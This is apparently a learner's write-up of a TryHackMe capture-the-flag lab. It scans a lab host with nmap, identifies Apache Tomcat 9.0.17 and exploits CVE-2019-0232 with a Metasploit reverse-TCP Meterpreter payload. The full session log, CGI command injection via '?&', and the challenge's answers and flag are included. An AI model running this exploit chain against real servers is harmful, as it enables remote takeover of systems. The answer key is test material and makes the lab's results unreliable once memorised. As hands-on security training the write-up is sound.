DAY 12 - READY,SET,ELF. [NETWORKING]
----

# STORY :
----
## Ready, set, elf. - Prelude:

>>Christmas is fast approaching, yet, all remain silent at The Best Festival Company (TBFC). What gives?! The cheek of those elves - slacking at the festive period! Santa has no time for slackers in his workshop. After all, the sleigh won't fill itself, nor will the good and naughty lists be sorted. Santa has tasked you, Elf McEager, with whacking those elves back in line.

----

# Todays Learning Objectives:
----

>>We're going to be applying some of the skills and techniques we previously explored in this year's Advent of Cyber. Let's put on our enumeration caps, crack our knuckles and get hands-on with learning about, discovering and exploiting an interesting functionality of web servers.

----

#  Vulnerability...reveal yourself!
----

>>As an application's lifecycle continues, so does its version numbering. Applications contain seemingly innocent hallmarks of information such as version numbering. Known as information disclosure, these nuggets of information are handed to us by the server through error messages such as in the following screenshot, HTTP headers or even on the website itself.

----

# Everything CGI (And no, not the movie kind...)
----

>>As you may have discovered throughout the "Web" portion of the event, webservers don't just display websites...They are capable of interacting with the operating system directly. The Common Gateway Interface or CGI for short is a standard means of communicating and processing data between a client such as a web browser to a web server.

>>Simply, this technology facilitates interaction with programmes such as Python script files, C++ and Java application, or system commands all within the browser - as if you were executing it on the command line.

>>Despite their age, CGI scripts are still relied upon from devices such as embedded computers to IoT devices, Routers, and the likes, who can't run complex frameworks like PHP or Node.

----

# The Nitty Gritty
----

>>Whilst CGI has the right intentions and use cases, this technology can quickly be abused by people like us! The commonplace for CGI scripts to be stored is within the /cgi-bin/ folder on a webserver. Take, for example, this systeminfo.sh file that displays the date, time and the user the webserver is running as:

>>When navigating to the location of this script using our browser, the script is executed on the web server, the resulting output of this is then displayed to us. How could we use this?

----

#  As We've Demonstrated...
----

>>We could, perhaps, parse our own commands through to this script that will be executed. Because we know that this is a Ubuntu machine,  we can try some Linux commands like ls to list the contents of the working directory:

>>Or on a Windows machine, the systeminfo command reveals some useful information:

>>This is achieved by parsing the command as an argument with ?& i.e. ?&ls. As this is a web server, any spaces or special characters will need to be URL encoded.

----

#  There are tools for this! Practical Metasploit
----

>>Now we understand the application that's running, tools such as Metasploit can be used to confirm suspicions and hopefully leverage them! After some independent research, this application is vulnerable to the ShellShock attack (CVE 2014-6271)

>>At the minimum, when using an exploit, Metasploit needs to know two things:

   * Your machine (such as the TryHackMe AttackBox) that you're attacking from (LHOST)
   * The target that you're attacking (RHOST(S))

>>Exploits will have their own individual settings that you will need to configure. We can list these by using the options command, then using set OPTION VALUE accordingly. In our example, the exploit involves CGI scripts and as such, we must specify the location of the script on the webserver that we're attacking. In the example so far, this was at http://10.0.0.1/cgi-bin/systeminfo.sh

>>In order for the attack used as the example in this task to work, the options would be set like so:
  * LHOST - 10.0.0.10 (our PC)
  * RHOST - 10.0.0.1 (the remote PC)
  * TARGETURI /cgi-bin/systeminfo.sh (the location of the script)

NOTE: Please note that these options are for the exploit used as an example, you will have to set these values accordingly for the challenge.

>>After ensuring our options are set right, Let's run the exploit to get a Meterpreter connection...Success!

>>To run system commands on the host, we will use shell. By creating a shell on the remote host, we can run system commands as if it were our own PC.

----

#  It's Challenge Time
----

>>To solve Elf McSkidy's problem with the elves slacking in the workshop, he has created the CGI script: elfwhacker.bat

>>Deploy the instance attached to this task, use your NMAP skills from "Day 8 - What's Under the Christmas Tree?  to find out what port the webserver MACHINE_IP is running on...Visit the application and discover the installation version, weaponise this information by searching knowledgebases for exploits and Meterpreter payloads possible and whack those elves!.

>>As this is a Windows machine, please allow a minimum of five minutes for it to deploy before beginning your enumeration.

>>Bonus: There are at least two ways of escalating your privileges after you gain entry. Find these out and pivot at your leisure! (please note that this is optional for the day should you fancy the challenge...)

----

# MY DOCUMENTATION :
----

>>USING NMAP TO FIND VERSIONS OF THE GIVEN_IP.

```bash [nmap RESULTS]
root@ip-10-10-251-126:~# nmap -sV 10.10.174.240

Starting Nmap 7.60 ( https://nmap.org ) at 2021-11-09 06:25 GMT
Nmap scan report for ip-10-10-174-240.eu-west-1.compute.internal (10.10.174.240)
Host is up (0.00033s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8009/tcp open  ajp13         Apache Jserv (Protocol v1.3)
8080/tcp open  http-proxy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.60%I=7%D=11/9%Time=618A1453%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2000,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;chars
SF:et=UTF-8\r\nDate:\x20Tue,\x2009\x20Nov\x202021\x2006:25:24\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n\r\n\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20la
SF:ng=\"en\">\r\n\x20\x20\x20\x20<head>\r\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<meta\x20charset=\"UTF-8\"\x20/>\r\n\x20\x20\x20\x20\x20\x20\x20\x20<t
SF:itle>Apache\x20Tomcat/9\.0\.17</title>\r\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20<link\x20href=\"favicon\.ico\"\x20rel=\"icon\"\x20type=\"image/x-ico
SF:n\"\x20/>\r\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"favicon\.i
SF:co\"\x20rel=\"shortcut\x20icon\"\x20type=\"image/x-icon\"\x20/>\r\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"tomcat\.css\"\x20rel=\"styl
SF:esheet\"\x20type=\"text/css\"\x20/>\r\n\x20\x20\x20\x20</head>\r\n\r\n\
SF:x20\x20\x20\x20<body>\r\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id=\"w
SF:rapper\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20id
SF:=\"navigation\"\x20class=\"curved\x20container\">\r\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\"nav-home\">
SF:<a\x20href=\"https://tomcat\.apache\.org/\">Home</a></span>\r\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\"n
SF:av-hosts\"><a\x20href=\"/docs/\">Documentation</a></span>\r\n\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id=\"nav
SF:-config\"><a\x20href=\"/docs/config/\">Configuration</a></span>\r\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20id
SF:=\"nav-examples\"><a\x20href=\"/examples/\">Examples")%r(HTTPOptions,7D
SF:,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r
SF:\nContent-Length:\x200\r\nDate:\x20Tue,\x2009\x20Nov\x202021\x2006:25:2
SF:4\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,8CB,"HTTP/1\.1
SF:\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Lang
SF:uage:\x20en\r\nContent-Length:\x202114\r\nDate:\x20Tue,\x2009\x20Nov\x2
SF:02021\x2006:25:24\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\"en\">
SF:<head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x
SF:20Not\x20Supported</title><style\x20type=\"text/css\">h1\x20{font-famil
SF:y:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-siz
SF:e:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:white;back
SF:ground-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahoma,Aria
SF:l,sans-serif;color:white;background-color:#525D76;font-size:14px;}\x20b
SF:ody\x20{font-family:Tahoma,Arial,sans-serif;color:black;background-colo
SF:r:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:white;back
SF:ground-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-serif;bac
SF:kground:white;color:black;font-size:12px;}\x20a\x20{color:black;}\x20a\
SF:.name\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D
SF:76;border:none;}</style></head><body><h");
MAC Address: 02:6E:D6:C8:6C:73 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
```

>>USING THE GIVEN_IP AND PORT NUMBER 8080
http://GIVEN_IP:8080

```WEB_CONTENTS 
Apache Tomcat/9.0.17
If you're seeing this, you've successfully installed Tomcat. Congratulations!
[tomcat logo]
Recommended Reading:
Security Considerations How-To
Manager Application How-To
Clustering/Session Replication How-To
Server Status
Manager App
Host Manager

Developer Quick Start

Tomcat Setup

First Web Application

Realms & AAA

JDBC DataSources

Examples

Servlet Specifications

Tomcat Versions

Managing Tomcat

For security, access to the manager webapp is restricted. Users are defined in:

$CATALINA_HOME/conf/tomcat-users.xml

In Tomcat 9.0 access to the manager application is split between different users.   Read more...

Release Notes
Changelog
Migration Guide
Security Notices
Documentation
Tomcat 9.0 Documentation
Tomcat 9.0 Configuration
Tomcat Wiki

Find additional important configuration information in:

$CATALINA_HOME/RUNNING.txt

Developers may be interested in:

    Tomcat 9.0 Bug Database
    Tomcat 9.0 JavaDocs
    Tomcat 9.0 SVN Repository

Getting Help
FAQ and Mailing Lists

The following mailing lists are available:

    tomcat-announce
    Important announcements, releases, security vulnerability notifications. (Low volume).
    tomcat-users
    User support and discussion
    taglibs-user
    User support and discussion for Apache Taglibs
    tomcat-dev
    Development mailing list, including commit messages


Other Downloads

    Tomcat Connectors
    Tomcat Native
    Taglibs
    Deployer

Other Documentation

    Tomcat Connectors
    mod_jk Documentation
    Tomcat Native
    Deployer

Get Involved

    Overview
    SVN Repositories
    Mailing Lists
    Wiki

Miscellaneous

    Contact
    Legal
    Sponsorship
    Thanks

Apache Software Foundation

    Who We Are
    Heritage
    Apache Home
    Resources


Copyright ©1999-2021 Apache Software Foundation. All Rights Reserved
```


>>FINDING THE ELFWHACKER FILE WITH "cgi-bin/elfwhacker.bat" COMMAND.
http://GIVEN_IP:8080/cgi-bin/elfwhacker.bat
```WEB_CONTENTS
-------------------------------------------------------
Written by ElfMcEager for The Best Festival Company ~CMNatic
-------------------------------------------------------

Current time: 09/11/2021  6:55:28.02

-------------------------------------------------------
                 Debugging Information
-------------------------------------------------------
Hostname: TBFC-WEB-01
User: tbfc-web-01\elfmcskidy

-------------------------------------------------------
                  ELF WHACK COUNTER
-------------------------------------------------------

 Number of Elves whacked and sent back to work: 23786 

```

>>FOUND THE CVE-2019-0232 IN RAPID-7 WHICH IS THE EXPLOIT FOR THE TOMCAT 9.0.17.

>>SETTING UP THE METASPLOIT TO EXPLOIT IT.

```bash
msf5 > search 2019-0232

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/http/tomcat_cgi_cmdlineargs  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability


msf5 > use exploit/windows/http/tomcat_cgi_cmdlineargs
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > option
[-] Unknown command: option.
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > options

Module options (exploit/windows/http/tomcat_cgi_cmdlineargs):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI path to CGI script
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.251.126    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache Tomcat 9.0 or prior for Windows


msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOSTS 10.10.174.240
RHOSTS => 10.10.174.240
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > set LHOSTS 10.10.251.126
LHOSTS => 10.10.251.126
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > set targeturi /cgi-bin/elfwhacker.bat
targeturi => /cgi-bin/elfwhacker.bat
msf5 exploit(windows/http/tomcat_cgi_cmdlineargs) > exploit

[*] Started reverse TCP handler on 10.10.251.126:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[*] Sending stage (176195 bytes) to 10.10.174.240
[*] Meterpreter session 1 opened (10.10.251.126:4444 -> 10.10.174.240:49998) at 2021-11-09 07:06:16 +0000

meterpreter > 
[!] Make sure to manually cleanup the exe generated by the exploit

meterpreter > ls
Listing: C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin
============================================================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100777/rwxrwxrwx  73802  fil   2021-11-09 07:06:10 +0000  VjIWl.exe
100777/rwxrwxrwx  825    fil   2020-11-19 03:49:25 +0000  elfwhacker.bat
100666/rw-rw-rw-  27     fil   2020-11-19 22:05:43 +0000  flag1.txt

meterpreter > cat flag1.txt 
thm{whacking_all_the_elves}

meterpreter > cat elfwhacker.bat 
@echo off
SET hostname = TBFC-WEB-01
SET user = tbfc-web-01\elfmcskidy
echo Content-Type: text/plain
echo.
echo -------------------------------------------------------
echo Written by ElfMcEager for The Best Festival Company ~CMNatic
echo -------------------------------------------------------
echo.
echo Current time: %date% %time%
echo.
echo -------------------------------------------------------
echo                  Debugging Information
echo -------------------------------------------------------
echo Hostname: TBFC-WEB-01
echo User: tbfc-web-01\elfmcskidy
echo.
echo -------------------------------------------------------
echo                   ELF WHACK COUNTER
echo -------------------------------------------------------
echo.
echo. Number of Elves whacked and sent back to work: %random% 

```

----

# ANSWER THE FOLLOWING :
----

1.What is the version number of the web server?
>>9.0.17

2.What CVE can be used to create a Meterpreter entry onto the machine? (Format: CVE-XXXX-XXXX)
>>CVE-2019-0232

3.Set your Metasploit settings appropriately and gain a foothold onto the deployed machine.
>>No answer needed

4.What are the contents of flag1.txt
>>thm{whacking_all_the_elves}

5.Looking for a challenge? Try to find out some of the vulnerabilities present to escalate your privileges!
>>No answer needed

----